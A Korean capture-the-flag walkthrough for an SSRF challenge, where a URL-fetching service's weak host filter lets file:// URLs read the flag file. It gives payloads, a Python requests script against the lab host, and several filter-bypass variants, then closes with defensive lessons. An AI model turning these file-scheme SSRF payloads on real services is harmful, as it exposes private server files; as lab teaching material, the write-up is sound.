# HTTP-CLI SSRF 취약점 공략 가이드

## 취약점 분석

### 코드 분석 (app-7.py)

```python
def get_host_port(url):
    return url.split('://')[1].split('/')[0].lower().split(':')

if 'localhost' == host:
    cs.sendall('cant use localhost\n'.encode())
    continue
if 'dreamhack.io' != host:
    if '.' in host:
        cs.sendall('cant use .\n'.encode())
        continue
cs.sendall('result: '.encode() + urllib.request.urlopen(url).read())
```

### 보안 검증의 허점

1. **localhost 차단**: `localhost`만 차단하고 `127.0.0.1`이나 IPv6는 검사하지만 `.`이 있어서 차단됨
2. **점(.) 검사**: `dreamhack.io`가 아닌 호스트에서 `.` 사용 차단
3. **file:// 스킴 미검증**: `file://` URL 스킴에 대한 검증이 없음!

### 핵심 취약점

`urllib.request.urlopen()`은 `file://` 스킴을 지원하는데, 검증 로직에서 이를 막지 못합니다.

## 공격 방법

### 방법 1: file:// 스킴 직접 사용 ⭐ (가장 간단)

```
file:///app/flag.txt
```

**작동 원리**:
- `url.split('://')[1]` → `/app/flag.txt`
- `.split('/')[0]` → 빈 문자열 ``
- 빈 문자열에는 `.`이 없으므로 검증 통과!

### 방법 2: file:// + dreamhack.io 호스트

```
file://dreamhack.io/app/flag.txt
```

**작동 원리**:
- host는 `dreamhack.io`가 되어 첫 번째 검증 통과
- `urllib.request.urlopen()`은 file 스킴에서 호스트를 무시하고 경로만 읽음

### 방법 3: 상대 경로 우회 (필요시)

```
file:///app/../app/flag.txt
file:///./app/flag.txt
```

## 실전 공격 순서

### 1단계: 웹 인터페이스 접속
```bash
# 브라우저에서 열기
http://host8.dreamhack.games:20622/
```

### 2단계: URL 입력
웹 페이지의 입력 필드에 다음 중 하나를 입력:

```
file:///app/flag.txt
```

또는

```
file://dreamhack.io/app/flag.txt
```

### 3단계: 제출 및 플래그 획득
- 제출 버튼 클릭
- 응답에서 `DH{...}` 형식의 플래그 확인

## Python 자동화 스크립트 (참고용)

```python
import requests

url = "http://host8.dreamhack.games:20622/"
payload = "file:///app/flag.txt"

# GET 방식
r = requests.get(url, params={'url': payload})
print(r.text)

# POST 방식
r = requests.post(url, data={'url': payload})
print(r.text)
```

## 추가 우회 기법

만약 위 방법이 막혀 있다면:

```
# Unicode 인코딩
file:///app/%66%6c%61%67.txt

# 대소문자 혼용 (검증이 case-sensitive한 경우)
FILE:///app/flag.txt
File:///app/flag.txt

# 백슬래시 (Windows 스타일)
file:///app\flag.txt

# 더블 슬래시
file:////app/flag.txt
```

## 예상 플래그 형식

```
DH{...}
```

## 문제 핵심 교훈

1. **URL 스킴 검증의 중요성**: HTTP/HTTPS뿐만 아니라 file://, ftp:// 등도 검증 필요
2. **화이트리스트 방식**: 블랙리스트 대신 허용할 스킴만 명시
3. **urllib의 보안 고려사항**: `urlopen()`의 다양한 스킴 지원을 이해하고 제한해야 함

---

**성공을 기원합니다! 🎯**
